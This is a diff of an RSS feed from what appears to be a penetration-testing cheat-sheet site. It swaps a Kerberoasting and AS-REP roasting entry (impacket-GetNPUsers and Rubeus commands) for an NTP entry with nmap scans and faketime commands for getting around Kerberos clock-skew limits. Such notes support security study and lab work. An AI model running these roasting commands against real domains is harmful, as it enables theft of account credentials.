@@ -8,11 +8,11 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@faketime/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Kerberoasting</title>
-      <link>https://tldrbins.github.io/roasting/</link>
+      <title>NTP</title>
+      <link>https://tldrbins.github.io/ntp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/roasting/</guid>
-      <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
+      <guid>https://tldrbins.github.io/ntp/</guid>
+      <description> Check Server Time sudo nmap -sU -sV --script &amp;#34;ntp* and (discovery or vuln) and not (dos or brute)&amp;#34; -p 123 10.10.11.10 Check Time Skew date; ntpdate -q 10.10.11.10 Update Time Fix ntpdate from doing nothing sudo apt install chrony sudo timedatectl set-ntp true sudo ntpdate -s 10.10.11.10 Using faketime # After getting the time skew faketime -f +9999s &amp;lt;COMMAND&amp;gt; # Get from http server faketime &amp;#34;$(curl -sI http://example.com | grep &amp;#39;Date:&amp;#39; | awk -F &amp;#39;Date:&amp;#39; &amp;#39;{print $2}&amp;#39;)&amp;#34; </description>
     </item>
   </channel>
 </rss>
